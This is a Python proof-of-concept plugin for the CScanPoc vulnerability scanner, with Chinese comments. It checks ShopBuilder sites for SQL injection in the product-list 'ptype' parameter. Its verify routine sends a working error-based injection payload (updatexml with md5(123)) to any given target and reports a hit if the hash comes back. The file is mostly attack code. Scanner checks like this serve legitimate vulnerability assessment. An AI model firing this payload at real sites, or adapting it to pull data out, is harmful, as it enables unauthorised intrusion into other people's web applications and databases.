# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Shopbuilder_0006' # 平台漏洞编号，留空
    name = 'ShopBuilder /?m=product&s=list&ptype SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-28'  # 漏洞公布时间
    desc = '''
        ShopBuilder /?m=product&s=list&ptype SQL注入
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'ShopBuilder'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '49434a91-2cf3-4a00-ad0e-a2334d52adeb'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload ="?m=product&s=list&ptype=0%27%20%20and%201=updatexml%281,concat%280x5c,md5%28123%29%29,1%29%23"
 
            url = arg + payload
            code, head, res, errcode,finalurl= hh.http(url)
                       
            if code == 200 and '202cb962ac59075b964b07152d234b7' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()